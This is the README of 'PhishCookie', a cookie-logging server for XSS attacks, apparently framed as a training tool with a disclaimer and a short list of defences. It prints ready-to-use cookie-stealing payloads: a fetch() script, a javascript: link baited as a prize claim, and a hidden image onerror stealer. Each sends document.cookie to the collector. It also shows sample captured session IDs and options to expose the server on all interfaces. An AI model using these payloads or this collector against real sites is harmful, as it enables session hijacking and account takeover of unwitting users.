# PhishCookie



PhishCookie is an educational tool designed to demonstrate how cross-site scripting (XSS) vulnerabilities can be exploited. It creates a simple HTTP server that can be used in controlled environments to showcase cookie theft and other XSS attack vectors.



## ⚠️ IMPORTANT DISCLAIMER

**This tool is created STRICTLY for:**
- Educational purposes
- Authorized security testing
- Controlled lab environments
- Cybersecurity training

**NEVER use this tool against any website or user without explicit permission. Unauthorized use is illegal and unethical.**

## 🔍 Overview

PhishCookie simulates how malicious actors exploit XSS vulnerabilities to steal cookies and other sensitive information. By understanding these techniques, developers and security professionals can better protect their applications.

![How XSS Works](https://github.com/Sergeb250/PhishCookie/blob/551c33af67d04ff6a86424b97ea3d17f125f7436/images/Screenshot%20(26).png)

## ✨ Features

- **Cookie Logger**: Captures and displays cookies sent via XSS payloads
- **Request Inspector**: Analyzes all incoming request data
- **Payload Generator**: Creates ready-to-use XSS payloads for testing
- **Simple Web Interface**: View logged data through an intuitive dashboard
- **Educational Resources**: Includes documentation on XSS prevention

## 📋 Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/PhishCookie.git

# Navigate to the directory
cd PhishCookie

# No additional dependencies required!
```

## 🚀 Quick Start

1. Start the PhishCookie server:

```bash
python phish_cookie.py
```

2. By default, the server runs on port 8080:

```
[*] PhishCookie server started on port 8080
[*] Waiting for incoming XSS payloads...
```

![Server Running](https://placeholder-for-screenshot.png)

## 💉 XSS Payload Examples

### Basic Cookie Stealer

```html
<script>
  fetch('http://localhost:8080/steal?cookie=' + encodeURIComponent(document.cookie))
    .then(response => console.log('Cookie sent'))
    .catch(error => console.error('Error:', error));
</script>
```

### Clickjacking Attack

```html
<a href="javascript:void(document.location='http://localhost:8080/steal?cookie='+document.cookie)">
  Click here to claim your prize! 🎁
</a>
```

### Image-Based Stealer (No JS Console Visibility)

```html
<img src="x" onerror="this.src='http://localhost:8080/steal?cookie='+document.cookie" style="display:none">
```

![XSS Attack Flow](https://placeholder-for-attack-flow.png)

## 📊 Understanding the Output

When a victim triggers an XSS payload, PhishCookie logs detailed information:

```
[+] XSS Payload Triggered! [2025-04-23 14:32:12]
[+] Source IP: 192.168.1.105
[+] User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
[+] Cookies Captured: 
    - sessionid=a68d42f0e8b11d3e7955
    - user_pref=dark_mode=true
    - _ga=GA1.2.1234567890.1234567890
[+] Referrer: https://vulnerable-site.example/login
```

## 🛡️ Prevention Techniques

PhishCookie helps demonstrate why these security measures are essential:

1. **Content Security Policy (CSP)**
2. **HttpOnly and Secure Cookie Flags**
3. **Input Validation & Output Encoding**
4. **X-XSS-Protection Headers**
5. **Modern Framework Protections**

## 🧪 Testing Scenarios

- **Self-XSS Demonstration**: Test on your own pages to understand impact
- **CTF Practice**: Use in cybersecurity competitions
- **Security Awareness**: Train team members on XSS risks
- **Penetration Testing**: During authorized security assessments

![Testing Scenario](https://placeholder-for-testing.png)

## 🔧 Advanced Configuration

PhishCookie supports several command-line arguments:

```bash
python phish_cookie.py --port 9090 --interface 0.0.0.0 --log-file cookies.log
```

| Option | Description |
|--------|-------------|
| `--port` | Server listening port (default: 8080) |
| `--interface` | Binding interface (default: localhost) |
| `--log-file` | Save captured data to file |
| `--web-interface` | Enable web dashboard (default: disabled) |

## 📚 Educational Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Learning Materials](https://portswigger.net/web-security/cross-site-scripting)
- [Mozilla Developer Network - Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)

## 🤝 Contributing

Contributions that improve the educational value of this tool are welcome:

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/educational-improvement`)
3. Commit your changes (`git commit -m 'Add new educational content'`)
4. Push to the branch (`git push origin feature/educational-improvement`)
5. Open a Pull Request

## 📜 License

Distributed under the MIT License. See `LICENSE` for more information.

## 📞 Contact
Project Link: [https://github.com/Sergeb250/PhishCookie](https://github.com/Sergeb250/PhishCookie)
